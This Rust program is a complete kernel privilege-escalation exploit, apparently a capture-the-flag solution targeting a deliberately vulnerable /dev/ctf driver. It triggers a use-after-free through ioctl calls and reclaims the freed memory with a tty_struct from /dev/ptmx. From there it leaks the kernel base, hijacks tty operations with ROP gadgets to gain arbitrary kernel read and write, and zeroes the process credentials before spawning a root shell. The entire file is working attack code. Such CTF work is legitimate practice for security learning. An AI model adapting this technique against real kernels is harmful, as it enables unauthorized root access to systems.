use std::fs::{OpenOptions, File};
use std::os::unix::io::{AsRawFd, RawFd};
use libc;
use libc::c_char;
use std::process;
use std::os::unix::process::CommandExt;
use std::io::stdout;
use std::io::{Write, Read};
use std::io::{Result, Error};
use byteorder::{ByteOrder, LittleEndian};
use std::ffi::CString;

const MALLOC : i32 = 1337;
const FREE : i32 = 1338;
const DEV_PATH : &str = "/dev/ctf";

#[repr(C)]
struct fake_tty {
    magic: i32,
    kref: i32,
    dev: u64,
    driver: u64,
    ops: u64,
    random: [u64; 0x3],
    // semaphore list_head. Use to get pointer to struct
    li_fd: u64,
    li_bk: u64
}

fn errExit() {
    println!("Error: {:}", Error::last_os_error());
    process::exit(1);
}

fn create(fd: RawFd, len: usize) {
    unsafe {
        let res = libc::ioctl(fd, MALLOC, len);

        if res < 0 {
            errExit();
        }
    }
}

fn delete(fd: RawFd) {
    unsafe {
        let res = libc::ioctl(fd, FREE);

        if res < 0 {
            errExit();
        }
    }
}

fn read(f: &mut File, buf: &mut Vec<u8>) {
    f.read_exact(buf).unwrap();
}

fn write(f: &mut File, data: &Vec<u8>) {
    f.write_all(&data[..]).unwrap();
}

fn hexdump(data: &Vec<u8>) {
    let mut nums : Vec<u64> = vec![0; data.len() / 0x8];
    LittleEndian::read_u64_into(data, &mut nums);

    for (i, elem) in nums.iter().enumerate() {
        if i % 2 != 0 {
            println!("{:#018x} ", elem);
        }
        else {
            print!("{:#06x}: {:#018x} ", i * 0x8, elem);
        }
    }
}

fn print_hex(msg: &str, val : u64) {
    println!("{}{:#018x} ", msg, val);
}

fn wait() {
    println!("Wait");
    let mut line = String::new();

    std::io::stdin().read_line(&mut line).expect("Failed to read line");
}

fn main() {

    /*
     * Calling as_raw_fd also here would result in the
     * file being dropped and the fd being invalid
     */
    let mut f = OpenOptions::new()
        .read(true)
        .write(true)
        .open(DEV_PATH)
        .expect("Failed to open dev");

    let fd = f.as_raw_fd();

    let mut data : Vec<u8> = Vec::new();
    let mut buf : Vec<u8> = vec![0; 0x400];

    let test : u64 = 0x4141414141;

    for _ in 0..4 {
        data.write_all(&test.to_ne_bytes()).unwrap();
    }

    create(fd, 0x400);
    delete(fd);

    let tty = OpenOptions::new()
        .read(true)
        .open("/dev/ptmx")
        .expect("Failed to open tty slave");

    let fd_tty = tty.as_raw_fd();

    read(&mut f, &mut buf);
    hexdump(&buf);

    let mut buf_64 : Vec<u64> = vec![0; buf.len() / 0x8];
    LittleEndian::read_u64_into(&buf, &mut buf_64);
    
    // https://stackoverflow.com/questions/42499049/transmuting-u8-buffer-to-struct-in-rust
    let (head, body, _tail) = unsafe { buf_64.align_to_mut::<fake_tty>() };
    let fake = &mut body[0];
    
    let k_base : u64 = fake.ops - 0x10745e0;
    let aar_gadget = k_base + 0x5efab5;
    let aaw_gadget = k_base + 0x112dd;
    let tty_struct : u64 = fake.li_fd - 0x7 * 0x8;
    let init_cred = k_base + 0x144d540;

    // 0xffffffff815efab5 : mov rax, qword ptr [rdx] ; ret
    // 0xffffffff810112dd : mov dword ptr [rdx], ecx ; ret

    print_hex("Kbase: ", k_base);
    print_hex("aar: ", aar_gadget);
    print_hex("aaw: ", aaw_gadget);
    print_hex("Tty struct: ", tty_struct);
    print_hex("init_cred: ", init_cred);

    let fake_ops = tty_struct + 0x64 * 0x8;
    print_hex("fake ops: ", fake_ops);

    fake.ops = fake_ops;
    std::mem::drop(fake);

    let aar_32 = |f: &mut File, addr: u64| -> i32 {
        let mut _buf : Vec<u8> = buf.clone();
        let mut _buf_64 = buf_64.clone();
        _buf_64[0x70] = aar_gadget;

        LittleEndian::write_u64_into(&_buf_64, &mut _buf);
        write(f, &mut _buf);

        unsafe {
            return libc::ioctl(fd_tty, 0xdead, addr);
        }
    };

    let aaw_32 = |f: &mut File, addr: u64, val: i32| {
        let mut _buf : Vec<u8> = buf.clone();
        let mut _buf_64 = buf_64.clone();
        _buf_64[0x70] = aaw_gadget;

        LittleEndian::write_u64_into(&_buf_64, &mut _buf);
        write(f, &mut _buf);

        unsafe {
            libc::ioctl(fd_tty, val, addr);
        }
    };

    unsafe {
        libc::prctl(libc::PR_SET_NAME, "b0r345\x00");
    }

    let mut addr_cred: u64 = 0x0;
    let mut cred_ptr_addr: u64 = 0x0;

    let start = tty_struct - 0x10000000;
    for addr in (start..=tty_struct - 0x8).rev().step_by(0x10) {
        let val = aar_32(&mut f, addr);
        if val == 0x33723062 {
            print_hex("Found: ", addr);
            cred_ptr_addr = addr-0x8;
            addr_cred = ((aar_32(&mut f, addr-0xc) as u32) as u64)
                    .rotate_left(32) | (aar_32(&mut f, addr-0x10) as u32) as u64;
            break;
        }
    }

    print_hex("Addr cred: ", addr_cred);
    print_hex("cred_ptr_addr: ", cred_ptr_addr);

    for i in 0..=8 {
        aaw_32(&mut f, addr_cred + 4 * i, 0x0);
    }
    
    //why does overwriting cred ptr not work ?
    /*
    aaw_32(&mut f, cred_ptr_addr, (init_cred & 0xffffffff) as i32);
    aaw_32(&mut f, cred_ptr_addr + 4, (init_cred.rotate_right(32)) as i32);
    */

    process::Command::new("/bin/sh").exec();

    wait();
}
